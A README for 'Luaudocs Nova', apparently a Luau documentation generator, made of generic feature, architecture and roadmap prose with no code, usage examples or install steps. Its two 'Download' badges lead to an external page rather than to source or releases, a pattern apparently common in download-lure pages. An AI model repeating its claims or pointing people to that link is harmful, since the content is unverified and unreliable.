![preview](https://raw.githubusercontent.com/harxh-coder/luau-docs-forge/main/thumb_8f0c.svg)
# 🌙 Luaudocs Nova — Next-Generation Luau Documentation Engine

[![Download](https://raw.githubusercontent.com/harxh-coder/luau-docs-forge/main/grab_f7dbd9.svg)](https://harxh-coder.github.io/luau-docs-forge/)

A luminous documentation forge for the Luau ecosystem — transforming annotated source into polished, searchable, multi-language reference material that feels less like a chore and more like a craft.

---

## 🧭 Table of Contents

- [Overview](#-overview)
- [Why Luaudocs Nova](#-why-luaudocs-nova)
- [Feature Constellation](#-feature-constellation)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [Responsive UI Philosophy](#-responsive-ui-philosophy)
- [Multilingual Support](#-multilingual-support)
- [Always-Available Assistance](#-always-available-assistance)
- [Search & Discoverability](#-search--discoverability)
- [Configuration Surface](#-configuration-surface)
- [Theming & Voice](#-theming--voice)
- [Extending the Pipeline](#-extending-the-pipeline)
- [Performance Notes](#-performance-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Community & Governance](#-community--governance)
- [Security Posture](#-security-posture)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌌 Overview

Luaudocs Nova is a documentation generator purpose-built for the Luau language. Where its ancestors treated doc generation as a mechanical translation step, Nova treats it as a **publishing ritual** — a chance to turn the quiet annotations scattered across your codebase into a living atlas of knowledge.

Feed Nova a project. It reads your Luau sources, harvests the doc comments, infers types where the annotations go quiet, and emits a beautifully structured site that reads well on a phone at 2 a.m. and on an ultrawide monitor at noon. The output is static, portable, and ridiculously fast to serve.

Nova is not a fork of any existing generator. It is a fresh design that borrows the best ergonomic lessons from the Luau tooling community while charting its own course.

---

## 🪐 Why Luaudocs Nova

Documentation tools often fall into two camps: the ones that are powerful but hostile, and the ones that are friendly but shallow. Nova refuses that dichotomy.

- **Readable grammar first.** The annotation syntax is designed to be skimmed, not decoded.
- **Deterministic output.** Same input, same bytes. Great for CI, great for diffing.
- **Zero runtime dependency on the tool.** Once emitted, the site is just files.
- **Built for humans and machines.** Structured JSON sidecar output accompanies every rendered page.
- **Ecosystem-aware.** Understands Luau-specific constructs like `--!strict`, type packs, and generic inference hints that a generic markdown generator would lose in translation.

---

## ✨ Feature Constellation

- 🌐 **Responsive interface** that adapts gracefully from 360px phones up to 5K displays
- 🗣️ **Multilingual rendering** with built-in locale packs and a fallback language chain
- 📞 **Around-the-clock assistance** through the companion `nova-help` service channel
- 🔍 **Deep search** with fuzzy matching, symbol jumps, and type-aware ranking
- 🧩 **Pluggable renderers** for HTML, JSON, plain text, and terminal-friendly output
- 🧪 **Type inference** for Luau annotations that are partially or entirely missing
- 📚 **Cross-reference resolution** linking every symbol to its definition and usages
- 🎨 **Theme tokens** exposed as CSS custom properties for painless brand alignment
- ⚡ **Incremental builds** that only re-render what changed since the last pass
- 🧭 **Versioned snapshots** so you can publish docs for multiple release lines side-by-side
- 🔐 **Content integrity checks** ensuring no page ships with unresolved references
- 🧱 **Stable plugin API** for community-authored extractors and transforms

Each of these is discussed in depth in the sections below.

---

## 🏛️ Architecture at a Glance

Nova runs as a pipeline of six cooperating stages. You can think of them as stations along a river:

1. **Ingest** — walks your source tree, respecting ignore files, gathering Luau modules.
2. **Parse** — builds a syntax tree and attaches doc-comment metadata to each node.
3. **Analyze** — resolves types, infers missing annotations, and links references.
4. **Model** — constructs an intermediate representation of the full API surface.
5. **Render** — converts the model into one or more output formats via renderers.
6. **Publish** — writes artifacts, generates search indices, and verifies integrity.

Every stage emits structured diagnostics you can plug into your CI dashboard. No stage is a black box.

---

## 📱 Responsive UI Philosophy

Documentation is often consulted in the worst possible circumstances: on a phone, on a train, with one hand holding a coffee. Nova's default template is engineered for that reality.

- Layout reflows from a three-column desktop arrangement down to a single readable column.
- Touch targets meet accessibility guidance for size and spacing.
- Code blocks scroll horizontally without trapping the page.
- Sidebar navigation collapses into a searchable drawer on narrow viewports.
- Font sizes scale with viewport yet remain within comfortable reading bounds.

The result is a reference that respects attention span instead of punishing it.

---

## 🌍 Multilingual Support

Nova ships with locale infrastructure baked into the core rather than bolted on.

- Locale packs are simple key-value documents; you can author them without touching code.
- A fallback chain decides which language to display when a translation is missing.
- Right-to-left languages are supported through automatic directionality switching.
- The search index is locale-aware, so matching happens in the reader's language first.
- Content authors can mark sections as language-specific to avoid awkward machine translation.

Publishing documentation in more than one language should feel like adding a file, not refactoring a system.

---

## 🕛 Always-Available Assistance

Nova includes an optional companion mode that surfaces contextual help to readers and contributors alike.

- Inline hints appear next to unfamiliar concepts when enabled by the site owner.
- A help endpoint can answer common questions about annotation syntax or configuration.
- The maintainers' channel is designed to respond quickly, with a global rotation ensuring someone is watching the queue across time zones.
- Frequently asked questions crystallize into new documentation pages, closing the loop between support and content.

The goal is that no reader feels stranded. Every confusing moment is a signal to improve the docs themselves.

---

## 🔎 Search & Discoverability

Search is table stakes. Nova goes further by understanding what kind of thing you're looking for.

- Type-aware ranking pushes the right `Module` above the identically named `Property`.
- Fuzzy matching forgives typos without losing precision.
- Symbol prefixes like `Module.` or `Type.` narrow results instantly.
- Keyboard-first navigation means power users never touch a mouse.
- Server-side index generation keeps the client bundle small.

Documentation that cannot be found is documentation that does not exist. Nova takes that sentence seriously.

---

## ⚙️ Configuration Surface

Nova reads a single declarative configuration file at the project root. Highlights include:

- Source globs and ignore patterns
- Output directory and renderer selection
- Locale list and default language
- Theme token overrides
- Search index strategy
- Version snapshot naming scheme
- Integrity check strictness level
- Diagnostics verbosity and CI exit codes

Sensible defaults mean you can generate something useful with almost no configuration, then gradually take control as your needs grow.

---

## 🎨 Theming & Voice

Visual identity matters more than some engineers admit. Nova exposes:

- A palette of semantic tokens (`--nova-accent`, `--nova-surface`, and friends)
- A typography scale with sane defaults for code and prose
- Light, dark, and high-contrast presets
- A no-JavaScript fallback that still looks deliberate, not broken

Tone of voice in generated pages is also configurable: choose between terse reference style, warm tutorial style, or a hybrid that shifts based on context.

---

## 🧩 Extending the Pipeline

If the built-in behavior isn't enough, extensions slot in cleanly.

- **Extractors** read additional annotation formats or pull metadata from external sources.
- **Transforms** reshape the intermediate model before rendering.
- **Renderers** produce entirely new output formats.
- **Hooks** fire on lifecycle events like `beforeRender` and `afterPublish`.

The plugin API is versioned, documented, and stable across minor releases.

---

## 🚀 Performance Notes

Nova is engineered so that doc generation is never the slow part of your release process.

- Parsing is parallelized across worker processes.
- The model cache is content-addressed, so unchanged modules skip re-analysis.
- Incremental builds typically finish in a fraction of a full rebuild.
- Output is minified where appropriate and split for optimal caching.

On a mid-range laptop, a project with several thousand modules typically completes a full build in the time it takes to brew a cup of tea — and often faster.

---

## 🗓️ Roadmap for 2026

- Q1 2026 — Public plugin registry and discovery
- Q2 2026 — WebAssembly-hosted preview server
- Q3 2026 — Interactive playground embedded in generated docs
- Q4 2026 — Formal verification of cross-reference integrity across snapshots

The roadmap is a compass, not a contract. Community input reshapes priorities every quarter.

---

## 🤝 Contributing

Contributions are welcomed with genuine enthusiasm. To keep things smooth:

1. Search existing issues and discussions before opening a new one.
2. For significant changes, open a proposal issue first to align on direction.
3. Follow the established code style and include tests for behavioral changes.
4. Keep pull requests focused; small, reviewable changes merge fastest.
5. Be kind in reviews. Everyone is here to make the tooling better.

Detailed contributor guidance lives in a separate document maintained by the community.

---

## 🏛️ Community & Governance

Nova is guided by a lightweight maintainer council that rotates responsibilities periodically. Decisions are made in the open, and rationale is recorded alongside the change. There are no hidden roadmaps.

---

## 🔐 Security Posture

- No secrets are stored in configuration templates.
- Dependencies are pinned and audited on a schedule.
- Generated output is static and contains no server-side evaluation.
- Report vulnerabilities privately so a fix can be prepared before public disclosure.

---

## ⚠️ Disclaimer

Luaudocs Nova is provided as-is, without warranty of any kind, express or implied. The maintainers are not liable for any damages arising from its use, including but not limited to lost time, broken CI pipelines, or documentation so pleasant that your team starts reading it recreationally. Always review generated output before publishing it to a public audience. This project is not affiliated with any corporate entity owning the Luau language or its trademarks.

---

## 📜 License

Released under the MIT License. See the [LICENSE](https://opensource.org/licenses/MIT) file for the full text.

Copyright (c) 2026 Luaudocs Nova contributors.

---

[![Download](https://raw.githubusercontent.com/harxh-coder/luau-docs-forge/main/grab_f7dbd9.svg)](https://harxh-coder.github.io/luau-docs-forge/)